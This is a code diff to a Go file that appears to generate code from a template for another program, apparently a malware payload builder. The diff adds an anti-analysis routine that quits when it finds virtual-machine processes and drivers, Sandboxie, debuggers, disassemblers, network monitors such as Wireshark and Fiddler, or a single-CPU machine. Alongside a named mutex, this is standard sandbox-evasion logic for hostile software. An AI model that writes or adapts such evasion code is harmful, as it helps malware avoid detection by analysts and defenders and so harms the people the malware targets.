@@ -135,6 +135,82 @@ func acquireMutex(name string) (windows.Handle, error) {
 	return h, nil
 }
 
+func checkAntiVps() {
+	if runtime.GOOS != "windows" {
+		return
+	}
+
+	vmProcesses := []string{
+		"VBoxService.exe",
+		"VBoxTray.exe",
+		"vmtoolsd.exe",
+		"VMwareTray.exe",
+		"VMwareUser.exe",
+		"prl_tools.exe",
+		"prl_cc.exe",
+	}
+	for _, p := range vmProcesses {
+		if checkProcessRunning(p) {
+			os.Exit(1)
+		}
+	}
+
+	vmFiles := []string{
+		"C:\\Windows\\System32\\VBox*.dll",
+		"C:\\Windows\\System32\\VBoxHook.dll",
+		"C:\\Windows\\System32\\VBoxGuest.sys",
+		"C:\\Windows\\System32\\VBoxMouse.sys",
+		"C:\\Windows\\System32\\VBoxSF.sys",
+		"C:\\Windows\\System32\\vmware-vmx.exe",
+		"C:\\Windows\\System32\\vmware-vmx-stats.exe",
+		"C:\\Windows\\System32\\vmware-vmx-debug.exe",
+	}
+	for _, pattern := range vmFiles {
+		if checkFileExists(pattern) {
+			os.Exit(1)
+		}
+	}
+
+	sandboxProcs := []string{
+		"SandboxieRpcSs.exe",
+		"SandboxieDcomLaunch.exe",
+		"SbieSvc.exe",
+		"procmon.exe",
+		"procmon64.exe",
+		"wireshark.exe",
+		"fiddler.exe",
+		"ollydbg.exe",
+		"idaq.exe",
+		"idaq64.exe",
+		"x64dbg.exe",
+		"x32dbg.exe",
+		"windbg.exe",
+	}
+	for _, p := range sandboxProcs {
+		if checkProcessRunning(p) {
+			os.Exit(1)
+		}
+	}
+
+	if runtime.NumCPU() < 2 {
+		os.Exit(1)
+	}
+}
+
+func checkFileExists(pattern string) bool {
+	matches, err := filepath.Glob(pattern)
+	return err == nil && len(matches) > 0
+}
+
+func checkProcessRunning(processName string) bool {
+	cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", processName), "/NH")
+	output, err := cmd.Output()
+	if err != nil {
+		return false
+	}
+	return strings.Contains(string(output), processName)
+}
+
 func setupLogger() *os.File { return nil }
 `, delay, buildID, buildID))
 }
